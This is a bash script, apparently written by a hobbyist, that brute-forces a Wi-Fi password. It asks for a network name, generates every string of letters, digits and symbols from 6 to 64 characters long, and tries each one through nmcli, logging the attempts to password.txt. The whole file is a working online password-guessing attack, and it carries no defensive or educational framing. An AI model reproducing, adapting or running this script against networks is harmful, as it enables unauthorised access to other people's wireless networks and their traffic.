#!/bin/bash

# I wrote this script to find wifi password
# Author: Amir Mahdi Ghorbani (Ammighorbani)


# Valid chars in wifi password
chars=(
"a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m"
"n" "o" "p" "q" "r" "s" "t" "u" "v" "w" "x" "y" "z"

"A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M"
"N" "O" "P" "Q" "R" "S" "T" "U" "V" "W" "X" "Y" "Z"

"0" "1" "2" "3" "4" "5" "6" "7" "8" "9"

"!" "@" "#" "$" "%" "^" "&" "*" "(" ")"
"-" "_" "=" "+"
"[" "]" "{" "}"
"\\" "|"
";" ":"
"'" "\""
"," "<" ">" "." "/" "?"
)

read -p "Enter your wifi name: " WIFI_NAME



base=${#chars[@]}

generate_strings() {

    local length=$1
    local indexes=()

    for ((i=0; i<length; i++)); do
        indexes[$i]=0
    done

    while true; do

        output=""

        for ((i=0; i<length; i++)); do
            output+="${chars[${indexes[$i]}]}"
        done

        echo "$output" >> password.txt

        # Connect to wifi with CLI
        nmcli dev wifi connect "$WIFI_NAME" password "$output" ifname wlp2s0 >> password.txt

        sleep 1

        pos=$((length - 1))

        while ((pos >= 0)); do

            ((indexes[$pos]++))

            if ((indexes[$pos] < base)); then
                break
            fi

            indexes[$pos]=0
            ((pos--))
        done

        if ((pos < 0)); then
            break
        fi
    done
}

for ((len=6; len<=64; len++)); do
    generate_strings "$len"
done
